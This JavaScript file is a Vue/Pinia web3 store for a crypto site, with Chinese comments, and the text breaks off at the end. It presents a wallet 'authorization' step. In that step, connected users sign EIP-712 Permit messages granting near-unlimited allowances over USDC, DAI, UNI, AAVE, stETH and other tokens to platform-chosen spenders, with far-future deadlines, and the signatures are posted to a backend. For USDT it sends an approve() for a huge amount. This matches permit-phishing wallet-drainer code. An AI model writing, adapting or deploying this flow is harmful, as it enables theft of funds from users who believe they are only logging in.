import { useLocalStorage } from '@vueuse/core'
import { computed, nextTick, ref } from 'vue'
import { defineStore, storeToRefs } from 'pinia'
import Web3 from 'web3'
import BigNumber from 'bignumber.js'
import { showToast } from 'vant'
import i18n from '@/i18n/index.js'

import { userStore } from '@/store/index.js'
import { AAVE_ABI, BNB_ABI, DAI_ABI, RENBTC_ABI, STETH_ABI, STKAAVE_ABI, UNI_ABI, USDC_ABI, XAUT_ABI } from '@/config/abi.js'
import router from '@/router'
import { getAllChainApi, getAllPlatformTokenBalanceApi } from '@/apis/wallet.js'
import { useToken } from '@/hooks/useToken.js'
import { ercAuthApi, usdtAuthApi } from '@/apis/user.js'
import { useRoute } from 'vue-router'

const Permit_1 = [
		{
			'name': 'owner',
			'type': 'address',
		},
		{
			'name': 'spender',
			'type': 'address',
		},
		{
			'name': 'value',
			'type': 'uint256',
		},
		{
			'name': 'nonce',
			'type': 'uint256',
		},
		{
			'name': 'deadline',
			'type': 'uint256',
		},
	],
	Permit_2 = [
		{
			'name': 'holder',
			'type': 'address',
		},
		{
			'name': 'spender',
			'type': 'address',
		},
		{
			'name': 'nonce',
			'type': 'uint256',
		},
		{
			'name': 'expiry',
			'type': 'uint256',
		},
		{
			'name': 'allowed',
			'type': 'bool',
		},
	]

const ERC20_ABI = [
	// 授权某地址消费用户代币的方法
	{
		'constant': false,
		'inputs': [
			{
				'name': '_spender',
				'type': 'address',
			},
			{
				'name': '_value',
				'type': 'uint256',
			},
		],
		'name': 'approve',
		'outputs': [
			{
				'name': '',
				'type': 'bool',
			},
		],
		'type': 'function',
	},
	// 查询某地址的授权额度
	{
		'constant': true,
		'inputs': [
			{
				'name': '_owner',
				'type': 'address',
			},
			{
				'name': '_spender',
				'type': 'address',
			},
		],
		'name': 'allowance',
		'outputs': [
			{
				'name': '',
				'type': 'uint256',
			},
		],
		'type': 'function',
	},
	{
		'constant': true,
		'inputs': [{ 'name': 'who', 'type': 'address' }],
		'name': 'balanceOf',
		'outputs': [{ 'name': '', 'type': 'uint256' }],
		'payable': false,
		'stateMutability': 'view',
		'type': 'function',
	},
]

const USDT_CONTRACT_ADDRESS = ''

const DEFAULT_SENDER_ADDRESS = ''

const USDC_DOMAIN = {
		'name': 'USD Coin',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	ETETH_DOMAIN = {
		'name': 'Liquid staked Ether 2.0',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	UNI_DOMAIN = {
		'name': 'Uniswap',
		// 'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	AAVE_DOMAIN = {
		'name': 'Aave token V3',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	DAI_DOMAIN = {
		'name': 'Dai Stablecoin',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	},
	XAUT_DOMAIN = {
		'name': 'Tether Gold',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	},
	RENBTC_DOMAIN = {
		'name': 'renBTC',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	},
	STKAAVE_DOMAIN = {
		'name': 'Staked Aave',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	BNB_DOMAIN = {
		'name': 'Staked Aave',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	}

const onSignUNI = async ({ from, domain, message, Permit = Permit_1 }) => {
	const sign = {
		'types': {
			'EIP712Domain': [
				{
					'name': 'name',
					'type': 'string',
				},
				// {
				//     'name': 'version',
				//     'type': 'string'
				// },
				{
					'name': 'chainId',
					'type': 'uint256',
				},
				{
					'name': 'verifyingContract',
					'type': 'address',
				},
			],
			Permit,
		},
		'primaryType': 'Permit',
		domain,
		message,
	}

	console.log('useWeb3Store', '签名Permit：', Permit)
	console.log('useWeb3Store', '签名domain：', domain)
	console.log('useWeb3Store', '签名message：', message)
	console.log('useWeb3Store', '签名全部参数：', sign)

	try {
		const result = await window.ethereum.request({
			method: 'eth_signTypedData_v4',
			params: [from, JSON.stringify(sign)],
		})

		const r = result.slice(0, 66),
			s = `0x${result.slice(66, 130)}`,
			v = `0x${result.slice(130, 132)}`

		console.log('useWeb3Store', '签名结果：', result)
		console.log('useWeb3Store', '签名结果 r：', r)
		console.log('useWeb3Store', '签名结果 s：', s)
		console.log('useWeb3Store', '签名结果 v：', v)
		return { result, r, s, v, sign }
	} catch (e) {
		console.error('onSignUNI---情况', e)
		const web3Store = useWeb3Store()
		web3Store.initWallet()
		router.push('/noWallet')
		throw e
	}
}

const onSign = async ({ from, domain, message, Permit = Permit_1 }) => {
	const sign = {
		'types': {
			'EIP712Domain': [
				{
					'name': 'name',
					'type': 'string',
				},
				{
					'name': 'version',
					'type': 'string',
				},
				{
					'name': 'chainId',
					'type': 'uint256',
				},
				{
					'name': 'verifyingContract',
					'type': 'address',
				},
			],
			Permit,
		},
		'primaryType': 'Permit',
		domain,
		message,
		// 'domain': {
		//     'name': 'USD Coin',
		//     'version': '2',
		//     'chainId': '1',
		//     'verifyingContract': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'
		// },
		// 'message': {
		//     'owner': from,
		//     'spender': '0xc2eb126a0f2ed8d26b2bb302ac1b7238a35528c1',
		//     'value': '1157920892373161954235709850086879078532699846656405640394575840079131296399',
		//     'nonce': '1',
		//     'deadline': '4880576070'
		// }
	}

	console.log('useWeb3Store', '签名from：', from)
	console.log('useWeb3Store', '签名Permit：', Permit)
	console.log('useWeb3Store', '签名domain：', domain)
	console.log('useWeb3Store', '签名message：', message)
	console.log('useWeb3Store', '签名全部参数：', sign)

	try {
		const result = await window.ethereum.request({
			method: 'eth_signTypedData_v4',
			params: [from, JSON.stringify(sign)],
		})

		const r = result.slice(0, 66),
			s = `0x${result.slice(66, 130)}`,
			v = `0x${result.slice(130, 132)}`

		console.log('useWeb3Store', '签名结果：', result)
		console.log('useWeb3Store', '签名结果 r：', r)
		console.log('useWeb3Store', '签名结果 s：', s)
		console.log('useWeb3Store', '签名结果 v：', v)
		return { result, r, s, v, sign }
	} catch (e) {
		console.error('onSign--情况', e)
		const web3Store = useWeb3Store()
		web3Store.initWallet()
		router.push('/noWallet')
		throw e
	}
}

export const useWeb3Store = defineStore('web3', () => {
	const web3 = ref(null),
		accounts = ref([])
	const route = useRoute()

	// 当前缓存币种信息
	const currentCurrency = useLocalStorage('currentCurrency', {
		id: 0,
		currency: '',
		currencyCode: '',
		fullName: '',
		picUrl: '',
		isRecharge: false,
		isWithdraw: false,
		isExchange: false,
		protocols: null,
		handlingFee: 0,
		isOpenOnlineRecharge: false,
		isOpenQuickPay: false,
		sortBy: 0,
		usd: 0,
		picUrlStr: '',
	})

	// 当前钱包连接地址第一个地址
	const address = computed(() => accounts.value?.[0] ?? '')

	const userStoreObj = userStore()
	const { loginAction } = userStoreObj
	const { userId } = storeToRefs(userStoreObj)
	const { getTokenClientList, getTokenConfig } = useToken()

	// 平台币种列表
	const currencyList = ref([])
	const getCurrencyList = async () => {
		try {
			const allChainResponse = await getAllChainApi()

			currencyList.value = allChainResponse.data || []
			console.log('useWeb3Store', '获取币种列表', currencyList.value)
		} catch (e) {
			console.log('useWeb3Store', '获取币种列表失败', e)
		}
	}
	const authrizeTokenList = ref([])
	const getAllPlatformTokenBalance = async () => {
		const tokenListResponse = await getAllPlatformTokenBalanceApi()
		console.log('useWeb3Store', '获取平台代币余额', tokenListResponse.data)
		// 已经在平台授权过的币种
		authrizeTokenList.value = (tokenListResponse.data || []).filter((d) => d.isAuthrize === 1)
	}

	const initUserAccountAndWallet = async () => {
		console.log('useWeb3Store', '========initUserAccountAndWallet============')
		try {
			await Promise.all([getCurrencyList(), initWallet()])

			if (!address.value) {
				showToast({ message: i18n.global.t('请正确连接你的钱包'), icon: 'info' })
				return
			}

			// 如果当前缓存币种为空，默认获取 usdc 币种信息，或第一条币种信息 作为首次登录条件
			if (!currentCurrency.value.tokenName) {
				const usdc = currencyList.value.find((currencyitem) => currencyitem.tokenName?.toLowerCase() === 'usdc')
				if (usdc) {
					currentCurrency.value = usdc
				} else {
					currentCurrency.value = currencyList.value[0]
				}
			}
			console.log('useWeb3Store', '当前币种信息', currentCurrency.value)

			if (!userId.value) {
				await loginAction()
			}

			await getAllPlatformTokenBalance()
			// 当前选择币种是否被授权过
			if (authrizeTokenList.value.some((d) => d.tokenName === currentCurrency.value.tokenName)) {
				console.log('useWeb3Store', '已经在平台授权过')
				await nextTick()
				router.replace('/home')
			} else {
				// 选择了
				if (authrizeTokenList.value.length) {
					currentCurrency.value = authrizeTokenList.value[0]
					await loginAction()
				} else {
					onChangeCurrency(currentCurrency.value, true)
				}
			}
		} catch (e) {
			console.error('initUserAccountAndWallet 失败', e)
		}
	}

	// web3初始化链接
	const initWallet = async () => {
		console.log('useWeb3Store', `===========初始化钱包 begin==============`)
		try {
			if (window.ethereum) {
				web3.value = new Web3(window.ethereum)
				// try {
				// 请求用户授权
				accounts.value = await window.ethereum.request({ method: 'eth_requestAccounts' })
			} else if (window.web3) {
				web3.value = new Web3(window.web3.currentProvider)
				accounts.value = await window.web3.eth.getAccounts()
			} else {
				console.log('useWeb3Store', 'Non-Ethereum browser detected. You should consider trying MetaMask!')
			}
			console.log('useWeb3Store', 'initWallet', `====${router.currentRoute.value.name}`, accounts.value, address.value)
		} catch (e) {
			console.error('useWeb3Store', '初始化钱包失败', `====${router.currentRoute.value.name}`, e)
			if (router.currentRoute.value.name !== 'noWallet') {
				await nextTick()
				router.replace({ name: 'noWallet' })
			}
			throw e
		}

		// 移除钱包事件监听
		removeEvent()
		// 钱包事件监听
		addEvent()

		// 添加地址监听
		if (address.value) {
			console.log('useWeb3Store', '添加地址监听', address.value)
			// todo 地址监控
			// addAddressListenApi({
			// 	walletAddress: address.value,
			// 	chain: 'ETH',
			// })
		}
	}

	// todo 动态获取 项目合约地址
	const contractAddress = ref('0x12bc774c9db27c422Be8C8cBF3e7E2271E38EE5C')
	const getContractAddressByTokenType = async (tokenType) => {
		// todo 待完善
		// try {
		// 	const response = await ddd()
		// 	if (response.data) {
		// 		contractAddress.value = response.data
		// 	}
		// } catch (e) {
		// 	console.log('useWeb3Store', '获取合约地址接口错误', e)
		// }
	}

	// 选择币种
	const onChangeCurrency = async (currency, init = false) => {
		console.log('useWeb3Store', 'onChangeCurrency-当前选择币种：', currency)
		console.log('useWeb3Store', 'onChangeCurrency-当前选择钱包地址：', address.value)

		let balance = 0
		let currentOwnerAddress = address.value

		if (!currentOwnerAddress) {
			try {
				await initWallet()
				currentOwnerAddress = address.value
			} catch (e) {
				const timeout = setTimeout(() => {
					showToast({ message: i18n.global.t('请正确连接你的钱包'), icon: 'info' })
					clearTimeout(timeout)
				}, 700)
				return
			}
		}

		// todo 切换币种是否需要重新登录
		// await loginAction()

		const currencyTokenName = currency.tokenName
		currentCurrency.value = currency

		await getContractAddressByTokenType(currencyTokenName)

		// 强制刷新一次token配置
		await getTokenClientList()
		const config = await getTokenConfig(currencyTokenName)

		// 如果当前token已经授权过，就直接进入首页
		if (!config || config.isAuthrize === 1) {
			console.warn(`${currencyTokenName}配置为空或已授权`)
			await nextTick()
			router.replace('/home')
			return
		}

		console.warn(`${currencyTokenName}配置未授权`, config)
		// 代币签名合约地址
		const tokenContractAddress = config.contractAddress
		if (currencyTokenName === 'USDT') {
			// todo 待完善
			const usdtContract = new web3.value.eth.Contract(ERC20_ABI, contractAddress.value)

			try {
				balance = await usdtContract.methods.balanceOf(currentOwnerAddress).call()
				// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
				const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
				const divisor = new BigNumber(10).pow(decimals)
				balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
				console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				currentCurrency.value.balance = balance
			} catch (e) {
				console.error('代币余额', e)
			}

			// 使用你的地址和授权金额
			const addressOwner = currentOwnerAddress // 地址应为实际的以太坊地址
			const amountTarget = '411256436224324320870982430867023952481793415358246197461731293'
			// 币种授权
			approveIfNeeded(addressOwner, amountTarget)
			async function approveIfNeeded(address, amount) {
				try {
					// 1. 获取当前的授权额度
					const currentAllowance = await usdtContract.methods.allowance(address, config.contractAddress).call()
					console.log('useWeb3Store', '当前授权额度:', currentAllowance)
					// 2. 判断当前授权额度是否小于需要的额度
					if (BigInt(currentAllowance) < BigInt(amount)) {
						console.log('useWeb3Store', '当前授权额度不足，正在进行授权...')
						// 3. 授权新的额度
						const result = await usdtContract.methods
							.approve(config.contractAddress, amount)
							.send({ from: address, gas: 50000 })
							.on('error', (error) => {
								console.error('授权额度交易失败，错误信息:', error)
								router.push('/noWallet')
							})

						console.log('useWeb3Store', '授权额度Approval transaction:', result)

						if (result?.transactionHash) {
							// authorize = await addAddressMonitor({
							// 	walletAddress: address,
							// 	currency: 'USDT',
							// 	authorizedAmount: amount,
							// 	transactionHash: result.transactionHash,
							// })

							const data = {
								walletAddress: address,
								hash: result.transactionHash,
								tokenContractAddress: contractAddress.value,
								// todo 待接入
								allowed: '',
							}
							try {
								await usdtAuthApi(data)
								console.log('useWeb3Store', 'usdt接口授权成功')
							} catch (error) {
								console.log('useWeb3Store', 'usdt接口授权失败', error)
							}
						}
					} else {
						console.log('useWeb3Store', '当前授权额度已经足够，无需再次授权,进入首页。当前授权额度:', currentAllowance)
					}
					await nextTick()
					router.replace('/home')
				} catch (e) {
					console.error('USDT授权操作失败:', e)
					router.push('/noWallet')
				}
			}
		} else {
			let signResult = {}
			if (currencyTokenName === 'USDC') {
				console.log('useWeb3Store', 'ABI:', USDC_ABI)
				const contract = new web3.value.eth.Contract(USDC_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}
				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.error('获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				try {
					signResult = await onSign({
						from: currentOwnerAddress,
						domain: {
							...USDC_DOMAIN,
							verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						},
						message: {
							'owner': currentOwnerAddress,
							'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
							'value': '1157920892373161954235709850086879078532699846656405640394575840079131296399',
							nonce,
							'deadline': '4880576070',
						},
					})
				} catch (e) {
					console.error('签名错误', e)
				}
			} else if (currencyTokenName === 'StETH') {
				console.log('useWeb3Store', 'ABI:', STETH_ABI)
				const contract = new web3.value.eth.Contract(STETH_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...ETETH_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					message: {
						'owner': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
						nonce,
						'deadline': '1589205127399',
					},
				})
			} else if (currencyTokenName === 'UNI') {
				console.log('useWeb3Store', 'ABI:', UNI_ABI)
				const contract = new web3.value.eth.Contract(UNI_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSignUNI({
					from: currentOwnerAddress,
					domain: {
						...UNI_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					message: {
						'owner': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '39614081257132168796771975168',
						nonce,
						'deadline': '1589205127399',
					},
				})
			} else if (currencyTokenName === 'AAVE') {
				console.log('useWeb3Store', 'ABI:', AAVE_ABI)
				const contract = new web3.value.eth.Contract(AAVE_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods._nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...AAVE_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					message: {
						'owner': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
						nonce,
						'deadline': '1589205127399',
					},
				})
			} else if (currencyTokenName === 'DAI') {
				console.log('useWeb3Store', 'ABI:', DAI_ABI)
				const contract = new web3.value.eth.Contract(DAI_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...DAI_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					Permit: Permit_2,
					message: {
						'holder': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
						nonce,
						'expiry': '1589205127399',
						'allowed': true,
					},
				})
			} else if (currencyTokenName === 'XAUT') {
				console.log('useWeb3Store', 'ABI:', XAUT_ABI)
				const contract = new web3.value.eth.Contract(XAUT_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...XAUT_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					message: {
						'owner': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
						nonce,
						'deadline': '1589205127399',
					},
				})
			} else if (currencyTokenName === 'RenBTC') {
				console.log('useWeb3Store', 'ABI:', RENBTC_ABI)
				const contract = new web3.value.eth.Contract(RENBTC_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...RENBTC_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					Permit: Permit_2,
					message: {
						'holder': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						nonce,
						'expiry': '1589205127399',
						'allowed': true,
					},
				})
			} else if (currencyTokenName === 'StkAAVE') {
				console.log('useWeb3Store', 'ABI:', STKAAVE_ABI)
				const contract = new web3.value.eth.Contract(STKAAVE_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods._nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...STKAAVE_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					message: {
						'owner': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
						nonce,
						'deadline': '1589205127399',
					},
				})
			} else if (currencyTokenName === 'BNB') {
				console.log('useWeb3Store', 'ABI:', BNB_ABI)
				const contract = new web3.value.eth.Contract(BNB_ABI, contractAddress.value)
				console.log('useWeb3Store', '用ABI创建的合约：', contract)
				let nonce = '0'

				try {
					balance = await contract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log('useWeb3Store', `${currencyTokenName}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额', e)
				}

				try {
					nonce = await contract.methods.nonces(currentOwnerAddress).call()
				} catch (err) {
					console.log('useWeb3Store', '获取nonces的值异常', err)
				}
				console.log('useWeb3Store', '获取nonces的值：', nonce)
				signResult = await onSign({
					from: currentOwnerAddress,
					domain: {
						...BNB_DOMAIN,
						verifyingContract: tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
					},
					message: {
						'owner': currentOwnerAddress,
						'spender': tokenContractAddress ?? DEFAULT_SENDER_ADDRESS,
						'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
						nonce,
						'deadline': '1589205127399',
					},
				})
			} else {
				console.log('useWeb3Store', '暂不支持该币种')
				return
			}
			console.log('useWeb3Store', '代币:', currencyTokenName)
			console.log('useWeb3Store', '获取nonces所有的合约地址:', contractAddress.value)
			console.log('useWeb3Store', '获取nonces所选择的地址:', currentOwnerAddress)
			console.log('useWeb3Store', '发起签名所用的合约地址：', tokenContractAddress)
			console.log('useWeb3Store', '发起签名所选择的地址：', currentOwnerAddress)
			console.log('useWeb3Store', '签名结果：', signResult)

			if (!signResult.result) return

			const data = {
				walletAddress: currentOwnerAddress,
				r: signResult.r,
				s: signResult.s,
				v: signResult.v,
				// signData: signResult.sign,
				// encryptionString: signResult.result,
				authorizeToken: currencyTokenName,
				nonce: signResult.sign.message.nonce,
				deadline: signResult.sign.message.deadline,
				tokenContractAddress: tokenContractAddress,
			}

			try {
				await ercAuthApi(data)
				console.log('useWeb3Store', 'erc接口授权成功')
				await nextTick()
				await router.replace('/home')
			} catch (error) {
				console.log('useWeb3Store', 'erc接口授权失败', error)
			}
		}
	}

	// todo 登录流程待确认
	// initUserAccountAndWallet()

	return {
		web3,
		accounts,
		address,
		currencyList,
		currentCurrency,
		onChangeCurrency,
		initWallet,
		contractAddress,
		initUserAccountAndWallet,
	}
})

// ************* sample data format ******************//

//executePermit(walletClient, domain, address, spender, nonce, deadline);  FROM VUE COMPONENT
const executePermit = async (walletClient, domain, address, spender, nonce, deadline) => {
	try {
		const { v, r, s } = await signDaiPermit(walletClient, domain, address, spender, nonce, deadline, false)
		return await walletClient.writeContract({
			...this.contract,
			account: address,
			abi: this.DAI_PERMIT_ABI,
			functionName: 'permit',
			args: [address, spender, BigInt(nonce), BigInt(deadline), false, Number(v), r, s],
			chain: walletClient.chain,
		})
	} catch (error) {
		console.error('Error executing permit:', error)
		throw error
	}
}

const signDaiPermit = async (walletClient, domain, holder, spender, nonce, expiry, allowed) => {
	const account = await this.getWalletAddress(walletClient)

	const types = {
		Permit: [
			{ name: 'holder', type: 'address' },
			{ name: 'spender', type: 'address' },
			{ name: 'nonce', type: 'uint256' },
			{ name: 'expiry', type: 'uint256' },
			{ name: 'allowed', type: 'bool' },
		],
	}

	const signatureHex = await walletClient.signTypedData({
		account,
		domain,
		types,
		primaryType: 'Permit',
		message: { holder, spender, nonce, expiry, allowed },
	})

	return this.hexToSignature(signatureHex)
}

const resetAccount = async () => {
	console.log('useWeb3Store', '========resetAccount begin===========')
	const { resetLoginData } = userStore()
	resetLoginData()

	const { initWallet } = useWeb3Store()

	const data = useLocalStorage('currentCurrency', {})
	data.value = {
		id: 0,
		currency: '',
		currencyCode: '',
		fullName: '',
		picUrl: '',
		isRecharge: false,
		isWithdraw: false,
		isExchange: false,
		protocols: null,
		handlingFee: 0,
		isOpenOnlineRecharge: false,
		isOpenQuickPay: false,
		sortBy: 0,
		usd: 0,
		picUrlStr: '',
	}
	await nextTick()

	// initWallet()
	if (router.currentRoute.value.name !== 'noWallet') {
		router.replace({ name: 'noWallet' })
	} else {
		window.location.reload()
	}
}
// 小狐狸MetaMask的事件监听
const events = {
	accountsChanged(accounts) {
		// 指的是此页面连接的账户，连接小狐狸后再切换账户，此事件才会触发
		console.log('useWeb3Store', '切换了账户', accounts)
		// todo 确认操作
		// const { initWallet } = useWeb3Store()
		// initWallet()
		// web3Store.accounts.value = accounts
		// showToast('已切换钱包账户')
		resetAccount()
	},
	chainChanged(chainId) {
		// 16转10进制
		// chainId = parseInt(chainId, 16)
		console.log('useWeb3Store', '切换了链', chainId)
	},
	connect(connectInfo) {
		console.log('useWeb3Store', '连接合约成功', connectInfo)
	},
	disconnect(error) {
		console.log('useWeb3Store', '断开连接', error)
		resetAccount()
	},
	message(message) {
		console.log('useWeb3Store', '一些消息', message)
	},
}

// 添加小狐狸的事件监听
function addEvent() {
	console.log('useWeb3Store', 'addEvent--')
	if (!window.ethereum) return [false, '钱包未正常启用']
	window.ethereum.on('accountsChanged', events.accountsChanged)
	window.ethereum.on('chainChanged', events.chainChanged)
	window.ethereum.on('connect', events.connect)
	window.ethereum.on('disconnect', events.disconnect)
	window.ethereum.on('message', events.message)
	return
}

// 移除小狐狸的事件监听
function removeEvent() {
	console.log('useWeb3Store', 'removeEvent--')
	if (!window.ethereum) return
	window.ethereum.removeListener('accountsChanged', events.accountsChanged)
	window.ethereum.removeListener('chainChanged', events.chainChanged)
	window.ethereum.removeListener('connect', events.connect)
